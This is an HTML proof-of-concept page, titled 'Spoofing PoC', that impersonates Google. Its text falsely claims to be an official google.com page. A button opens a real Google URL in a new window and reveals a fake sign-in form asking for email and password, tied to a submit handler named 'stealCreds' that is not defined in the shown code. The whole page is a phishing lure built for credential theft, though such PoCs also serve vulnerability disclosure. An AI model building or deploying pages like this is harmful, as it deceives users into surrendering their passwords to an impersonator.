<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Spoofing PoC</title>
    <style>
      body {
        margin: 0;
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background: #fff;
        text-align: center;
      }
      .box {
        max-width: 420px;
        padding: 32px;
      }
      h1 {
        color: #4285f4;
        margin-bottom: 12px;
      }
      p {
        color: #666;
        margin-bottom: 24px;
      }
      button {
        padding: 12px 20px;
        border: none;
        border-radius: 8px;
        background: #4285f4;
        color: #fff;
        font-size: 16px;
        cursor: pointer;
      }
      .fake-panel {
        display: none;
        margin-top: 24px;
        padding: 20px;
        border: 1px solid #ddd;
        border-radius: 10px;
        background: #fafafa;
      }
    </style>
  </head>
  <body>
    <div class="box">
      <h2>This page is official from Google, to prove it you have to click the 'Sign in to Google' button below.</h2>
      <button onclick="runPoC()">Sign in to Google</button>

      <div
        class="fake-panel"
        id="panel"
        style="
          display: none;
          margin-top: 24px;
          padding: 20px;
          border: 1px solid #ccc;
        "
      >
        <h3>
          This page is a google.com page, you can see it yourself above, please
          fill in your username and password below.
        </h3>

        <form id="phishForm" onsubmit="stealCreds(event)">
          <div>
            <label>Email or Phone:</label><br />
            <input
              type="text"
              id="username"
              name="username"
              size="40"
              required
            />
          </div>
          <div style="margin-top: 10px">
            <label>Password:</label><br />
            <input
              type="password"
              id="password"
              name="password"
              size="40"
              required
            />
          </div>
          <div style="margin-top: 15px">
            <button type="submit">Sign In</button>
          </div>
        </form>

        <div id="result" style="margin-top: 10px"></div>
      </div>
    </div>

    <script>
      function runPoC() {
        const w = window.open("https://www.google.com/csi", "_blank");
        document.getElementById("panel").style.display = "block";
      }
    </script>
  </body>
</html>
